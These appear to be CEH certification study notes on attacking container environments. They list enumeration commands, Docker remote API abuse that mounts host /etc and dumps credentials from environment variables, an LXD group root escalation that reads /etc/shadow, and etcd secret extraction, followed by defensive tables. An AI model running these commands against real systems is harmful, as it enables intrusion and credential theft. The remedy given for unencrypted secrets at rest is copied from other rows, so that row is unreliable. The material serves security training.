# 07 — Container Hacking

> **CEH v13 Module 19 | Objective 07: Demonstrate Container Hacking**

---

## Information Gathering using kubectl

Attackers can perform information gathering to uncover weaknesses in containerized environments. For this purpose, attackers can use **kubectl**, a command-line tool, to interact with the Kubernetes cluster and gather relevant information about the cluster and its components for further malicious activities.

```bash
# List all the pods in the Kubernetes cluster
kubectl get pods

# Fetch detailed information about a specific pod
kubectl describe pod <pod-name>

# Dump the logs of a specific pod
kubectl logs <pod-name>

# Display all the services running in the cluster
kubectl get services

# Display detailed information about the services
kubectl describe services

# Display all the deployments in a cluster
kubectl get deployment

# Fetch detailed information about a specific deployment
kubectl describe deployment <deployment-name>

# Display all the service accounts in a cluster
kubectl get serviceaccounts

# Display detailed information about service accounts
kubectl describe serviceaccounts
```

---

## Enumerating Container Registries

The enumeration of registries can provide detailed information about containerized environments. Attackers can enumerate registries to identify outdated images or misconfigured containers with known vulnerabilities. This process also enables them to gather information such as environment variables, network configurations, and other metadata stored within the image layers, which can be leveraged for further exploitation.

Once they discover a registry, attackers may attempt to download or tamper with the stored images.

```bash
# Log in to a registry
docker login <registry-url>

# List repositories for a user or organization (Docker Hub)
curl -s https://hub.docker.com/v2/repositories/<username>/

# List the images in a specified Docker registry using the registry API
curl -u <username>:<password> https://<registry-url>/v2/_catalog

# List tags for an image in a registry
curl -u <username>:<password> https://<registry-url>/v2/<image-name>/tags/list
```

---

## Container and Kubernetes Vulnerability Scanning

Container images consist of an operating system, application, runtime, etc. packaged together. These containers are reused widely and may contain open-source frameworks with vulnerability issues. These vulnerabilities compromise the security not only of each container but of the entire container engine.

### Trivy

Source: https://github.com

Trivy is an automated tool used to perform container image vulnerability scanning. One needs to specify the image name to launch an accurate scanning operation. Trivy helps in detecting vulnerabilities of OS packages, such as Alpine, RHEL, and CentOS, and application dependencies, such as Bundler, Composer, npm, and yarn.

```bash
# Basic syntax
trivy <target> [--scanners <scanner1,scanner2>] <subject>

# Examples
trivy image nginx:latest
trivy image --scanners vuln alpine:3.15
trivy fs /path/to/project
trivy repo github.com/knqyf263/trivy-ci-test
```

### Sysdig

Source: https://sysdig.com

Sysdig identifies Kubernetes vulnerabilities by integrating the continuous delivery/deployment (CD) pipelines, image registry, and Kubernetes admissions controllers. Sysdig also validates container images at the orchestration level using the Kubernetes admission controller feature. Sysdig automatically generates an inventory of each image content and continuously checks for any new vulnerabilities or common vulnerabilities and exposures (CVEs) associated with containers.

**Additional Kubernetes Vulnerability Scanning Tools:**

- **Kubescape** (https://github.com)
- **kube-hunter** (https://github.com)
- **kubeaudit** (https://github.com)
- **KubiScan** (https://github.com)
- **Krane** (https://github.com)

---

## Exploiting Docker Remote API

After gaining access to the target Docker host, attackers exploit the Docker remote API to launch further attacks, such as mining cryptocurrency, initiating attacks by masking IPs, creating botnets to perform DoS attacks, installing services for phishing campaigns, retrieving sensitive credentials, and compromising the security of the internal network.

**Note:** Attackers can perform these activities only after escalating their privileges to the administrative level.

### Retrieving Files from the Docker Host

Attackers create a new container and mount it to the folder on the Docker host to gain access to other files.

```bash
# Pull an image (e.g., Alpine Linux)
docker -H <Remote IP:Port> pull alpine

# Create a container from the image
docker -H <Remote IP:Port> run -t -d alpine

# Run the ls command inside the container to list files stored on the Docker host
docker -H <Remote IP:Port> exec modest_goldstine ls
```

**Similarly, attackers can mount the host's `/etc` path to the container:**

```bash
# Create a container with the host /etc path mounted
docker -H <Remote IP:Port> run -t -d -v /etc:/host_etc alpine

# Read sensitive files from the mounted path
docker -H <Remote IP:Port> exec <container> cat /host_etc/hosts
```

This allows attackers to make a malicious entry in the host files, thereby granting persistent access.

**Attackers can also access data stored outside the host by identifying mounted volumes:**

```bash
# Inspect a container to find mounted volumes (shows Type/Source/Destination/Driver/RW in JSON "Mounts")
docker -H [docker remote host] inspect [container name]

# List files in the mounted directory
docker -H [docker remote host] exec -i [container name] ls /dest/dir/

# Read files in the mounted directory
docker -H [docker remote host] exec -i [container name] cat /dest/dir/one/file
```

If any mount has write access, attackers can manipulate the files stored on the external storage.

### Scanning the Internal Network

If an attacker creates a container in the existing Docker network bridge, they can access all hosts that the principal Docker host can access within the internal working systems.

```bash
# Scan the host's internal network using Nmap inside a Docker container
docker -H <docker-host> run --network=host --rm marsmensch/nmap -oX <IP Range>
```

### Retrieving Credentials

Environment variables are commonly used in Docker for passing credentials as arguments while running the containers. Attackers use the Docker inspect command to identify available environment variables on the Docker host.

```bash
# Inspect a container to find environment variables (including credentials)
docker -H [docker remote host] inspect [container name]

# Dump all environment variables including credentials
docker -H [docker remote host] exec -i [container name] env
```

### Querying Databases

After retrieving credentials, attackers can execute queries on MySQL containers to retrieve sensitive information stored in the database tables.

```bash
# Find MySQL containers on the target Docker host
docker -H [docker remote host] ps | grep mysql

# Retrieve MySQL credentials from environment variables
docker -H [docker remote host] exec -i some-mysql env

# List databases using the stolen credentials
docker -H [docker remote host] exec -i some-mysql mysql -u root -p <password> -e "show databases"
```

---

## Hacking Container Volumes

In Kubernetes, containers use volumes to share filesystems and manipulate container files. A volume is similar to a directory that stores files and is accessible to all containers in a pod. Kubernetes supports different types of volumes, such as the Network File System (NFS) and Internet Small Computer Systems Interface (iSCSI).

Attackers can exploit **weak and default configurations** in these volumes to launch privilege escalation attacks and perform lateral movement in the internal network.

**Attack vectors:**

- **Accessing Master Nodes** — volume configurations, such as iSCSI, store configuration and security details in the form of secrets; if attackers can gain access to the API or etcd, they can easily retrieve the configuration details of these volumes
- **Accessing Nodes** — kubelet manages the pods, so if attackers can gain access to a node in a pod, they can easily access all volumes used within the pod; furthermore, if attackers use the filesystem tools for viewing logs, they can obtain useful information about a node; for example, attackers can use the "df" command to retrieve configuration details of volumes using NFS
- **Accessing Container** — similar to accessing the nodes, attackers can also retrieve the same information from within the container itself; by attracting volumes from a container, attackers can configure a hostpath volume type to retrieve sensitive information from a node; attackers can further use the filesystem tools to browse all mounted volumes

**Note:** Attackers can perform these activities only after escalating their privileges to the administrative level.

---

## LXD/LXC Privilege Escalation

LXD is a container manager and LXC is its underlying container runtime. They are often used to run full Linux distributions within containers. If a user is part of the `lxd` group on a system, they can exploit this membership to escalate their privileges to root. This is because members of the `lxd` group have significant control over container creation and management, which can be leveraged to gain access to the host system.

**Steps to Perform LXD/LXC Group Privilege Escalation:**

```bash
# Step 1: Create the Alpine Docker image
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

# Step 2: Build the image using distrobuilder
# (Note: check the group membership first using 'id' command)
sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.18

# Step 3: Import the Alpine Linux image into LXD
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

# Note: lxd.tar.xz and rootfs.squashfs are example filenames

# Step 4: Check for the image in the container
lxc image list

# Step 5: Create a container and list the containers (privileged)
lxc init alpine privesc -c security.privileged=true

# Step 6: List containers
lxc list

# Step 7: Configure the container to mount the host root filesystem
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true

# Step 8: Start the container
lxc start privesc

# Step 9: Execute /bin/sh inside the container (host / is mounted at /mnt/root)
lxc exec privesc /bin/sh

# Now navigate the host filesystem
ls /mnt/root/
cat /mnt/root/etc/shadow
```

**Note:** Before creating the Alpine Docker image, check the `lxd` group membership using the `id` command. Also, ensure to install distrobuilder to build custom Linux distribution images and also include the LXD/LXC container system.

---

## Post Enumeration on Kubernetes etcd

Kubernetes is a distributed computing platform; therefore, it requires a distributed database, such as etcd. Etcd is a distributed and consistent key-value store, where Kubernetes cluster data, service discovery details, API objects, etc. are stored. The API server communicates with etcd to retrieve and store information critical to the Kubernetes components.

In Kubernetes, only the API server is allowed to access the etcd store. Attackers enumerate etcd processes, configuration files, open ports (identifying port number 2379), etc. to identify endpoints connected to the Kubernetes environment.

```bash
# Locate the etcd server and PKI information
ps -ef | grep apiserver

# Enumerate secrets stored in the Kubernetes cluster
ETCDCTL_API=3 ./etcdctl \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/apiserver-etcd-client.crt \
  --key=/etc/kubernetes/pki/apiserver-etcd-client.key \
  --endpoints=https://127.0.0.1:2379 \
  get /registry/ --prefix | grep -a '/registry/secrets/'

# Retrieve a specific secret (e.g., a service account token) and decode to YAML
ETCDCTL_API=3 ./etcdctl \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/apiserver-etcd-client.crt \
  --key=/etc/kubernetes/pki/apiserver-etcd-client.key \
  --endpoints=https://127.0.0.1:2379 \
  get /registry/secrets/kube-system/weave-net-token-nmb26 | ./auger decode -o yaml
```

**Note:** Attackers can perform these activities only after escalating their privileges to the administrative level.

---

## Kubernetes Vulnerabilities and Solutions

| Vulnerability | Solution |
|--------------|----------|
| No Certificate Revocation | Ensure nodes maintain the certificate revocation list (CRL) and check each time they are presented with a certificate; insist that administrators utilize the online certificate status protocol (OCSP) stapling for revoking certificates in the cluster via an OCSP server |
| Unauthenticated HTTPS Connections | By default, authenticate all HTTPS connections within the system; ensure that all the components use CA maintained by kube-apiserver; implement two-way TLS for all connections |
| Exposed Bearer Tokens in Logs | Remove the bearer token from the system logs and avoid logging any authentication credentials; perform code reviews to ensure sensitive data is not logged; implement logging filters to remove sensitive data before storing in logs |
| Exposure of Sensitive Data via Environment Variables | Avoid collecting sensitive data directly from environment variables; use Kubernetes secrets in all system components |
| Secrets at Rest not Encrypted by Default | Define and use a safe constant-time comparison function, such as `crypto.subtle.ConstantTimeCompare`; use a configuration method for credential paths and avoid hardcoding |
| Non-constant Time Password Comparison | Use a safe constant-time comparison function such as `crypto.subtle.ConstantTimeCompare`; disapprove of basic authentication mechanisms for secure options |
| Hardcoded Credential Paths | Define a configuration method for credential paths and avoid hardcoding credential paths; allow cross-platform configuration through path generalization |
| Log Rotation is not Atomic | Implement a copy-then-rename technique to ensure logs are not lost during log rotation; avoid using log rotation and implement persistent logs that add log data linearly and create a new log whenever log rotation is required |
| No Back-off Process for Scheduling | Implement a back-off process for kube-scheduler to prevent tight-loops; use secondary logging mechanisms for processes that require strict non-repudiation and auditing |
| No Non-repudiation | All authentication events should be logged and retrievable from a central location within the cluster |

---

## Container Security Best Practices

| # | Best Practice |
|---|--------------|
| 1 | Regularly monitor the CVEs of the container runtime and remediate if any vulnerabilities are detected |
| 2 | Enable comprehensive logging and auditing to track access, changes to containers, and their configurations |
| 3 | Configure applications to run as normal users to prevent privilege escalation |
| 4 | Configure the host's root file system in read-only mode to restrict write access and prevent malware injection attacks |
| 5 | Avoid using third-party software; employ application security scanning tools to protect containers from malicious software |
| 6 | Perform regular scanning of the images in the repository to identify vulnerabilities or misconfigurations |
| 7 | Deploy application firewalls for enhancing container security and prevent threats entering the environment |
| 8 | Ensure authenticated access to registries including sensitive images and data |
| 9 | Use minimal base images to reduce the attack surface and potential vulnerabilities |
| 10 | Use a separate database for each application for greater visibility of individual applications and enhanced data management |

**Additional best practices:**
- Regularly update the host operating system and the kernel to the latest security patches
- Configure orchestrators to deploy a set of hosts separately based on their sensitivity level
- Automate the compliance to the container runtime configuration standards
- Continuously perform monitoring of images for embedded malware
- Store sensitive data externally and allow dynamic access at the runtime
- Maintain a set of trusted registries and ensure only images from this set are permitted to run in the container environment
- Use mandatory access controls, such as SELinux and AppArmor, to prevent attacks on applications and system services
- Employ real-time threat detection solutions and develop incident response capabilities to handle security incidents
- Implement immutable containers that disallow container modification after deployment
- Change the users' default privileges from root to non-root and configure permissions using role-based access control (RBAC)
- Avoid writing sensitive information to code and configuration files
- Harden the host environment by removing non-critical native services; also harden the entire stack
- Always keep containers lightweight by reducing the number of components
- Leverage Infrastructure-as-Code (IaC) to manage the cloud resources and verify the configuration before deployment
